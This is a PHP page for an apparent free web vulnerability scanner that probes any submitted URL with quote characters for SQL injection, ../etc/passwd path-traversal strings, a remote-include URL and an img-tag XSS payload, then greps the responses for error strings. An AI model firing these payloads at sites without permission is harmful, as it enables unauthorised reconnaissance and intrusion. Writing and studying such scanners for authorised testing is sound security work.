<?php
    set_time_limit(0);
?>
<html>
<head>

   <title>Website Vulnerability Scanner</title>





 <h1>Website Vulnerability Scanner</h1>  
         
Website Vulnerability Scanner - The Only Free No Signup Vulnerability Scanner                                     
    </pre>
   
    <form method="POST" action="">
        Enter URL : <input type="text" name="url" value="<?php if(isset($_POST['url'])){echo(htmlentities($_POST['url']));}
        else{echo('https://example.com/index.php?id=1');} ?>" size="75" class="Input" />
        <input type="submit" name="submit" value="Find Vulnerability" class="Button" />
    </form>
   
    <br />
    <?php
   
   

    class Vulnscanner
    {
      private $sql       = array("'",'"');
      private $rfi       = array("https://www.facebook.com");
      private $lfi       = array("../etc/passwd",
                           "../../etc/passwd",
                           "../../../etc/passwd",
                           "../../../../etc/passwd",
                           "../../../../../etc/passwd",
                           "../../../../../../etc/passwd");
      private $xss       = array("'\"/><img src=\"https://owned.com\"/>");
     
     
     
      private $sqlerrors   = array("mysql_", "You have an error in your SQL syntax", 
                                  "SQL Error", "Database Error", "supplied argument is not a valid MySQL result resource");
      private $rfierrors   = array("Welcome to Facebook - Log In, Sign Up or Learn More", "failed to open stream: No such file or directory");
      private $lfierrors   = array("root:x:0:0:root:", "failed to open stream: No such file or directory");
      private $xsserrors   = array("<img src=\"https://owned.com\"/>");
     
      public function isvalid($link)
      {
         if(filter_var($link,FILTER_VALIDATE_URL) && strstr($link,"="))
            return true;
         return false;
      }
     
      private function getcontents($link)
      {
         $agent= 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_VERBOSE, true);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_USERAGENT, $agent);
         curl_setopt($ch, CURLOPT_URL,$link);
         $result=@curl_exec($ch);
         return $result;
      }
     
      private function errorcheck($url,$addtourl,$errorar)
      {
         foreach($addtourl as $val)
         {
            $link = $url.$val;
            $contents = $this->getcontents($link);
            foreach($errorar as $err)
            {
               if(strstr($contents, $err))
                  return true;
            }
         }
         return false;
      }
     
      public function issqlvulnerable($link)
      {
         $orig = $link;
         if($this->errorcheck($orig,$this->sql,$this->sqlerrors))
            echo htmlentities($orig) ." <span style=\"color: red;\">might</span> be vulnerable to SQL Injection.<br />";
         else
            echo htmlentities($orig) ." is probably <span style=\"color: red;\">NOT</span> vulnerable to SQL Injection.<br />";
      }
     
      public function isrfivulnerable($link)
      {
         $orig = $link;
         $link = substr($link,0,strpos($link,'=')+1);
         if($this->errorcheck($link,$this->rfi,$this->rfierrors))
            echo htmlentities($orig) ." <span style=\"color: red;\">might</span> be vulnerable to RFI.<br />";
         else
            echo htmlentities($orig) ." is probably <span style=\"color: red;\">NOT</span> vulnerable to RFI.<br />";
      }
     
      public function islfivulnerable($link)
      {
         $orig = $link;
         $link = substr($link,0,strpos($link,'=')+1);
         if($this->errorcheck($link,$this->lfi,$this->lfierrors))
            echo htmlentities($orig) ." <span style=\"color: red;\">might</span> be vulnerable to LFI.<br />";
         else
            echo htmlentities($orig) ." is probably <span style=\"color: red;\">NOT</span> vulnerable to LFI.<br />";
      }
     
      public function isxssvulnerable($link)
      {
         $orig = $link;
         $link = substr($link,0,strpos($link,'=')+1);
         if($this->errorcheck($link,$this->xss,$this->xsserrors))
            echo htmlentities($orig) ." <span style=\"color: red;\">might</span> be vulnerable to XSS.<br />";
         else
            echo htmlentities($orig) ." is probably <span style=\"color: red;\">NOT</span> vulnerable to XSS.<br />";
      }
   
   } // END OF CLASS
   
   
   
    if(isset($_POST['url']) && isset($_POST['submit']))
    {
      $obj = new Vulnscanner();
      $link = $_POST['url'];
      if($obj->isvalid($link))
      {
         $obj->islfivulnerable($link);
         $obj->isxssvulnerable($link);
         $obj->issqlvulnerable($link);
         $obj->isrfivulnerable($link);
      }
      else
      {
         echo "<span style=\"color: red;\">". htmlentities($link) ." is not a valid link.</span>";
      }
    }
    ?>
</body>
</html> 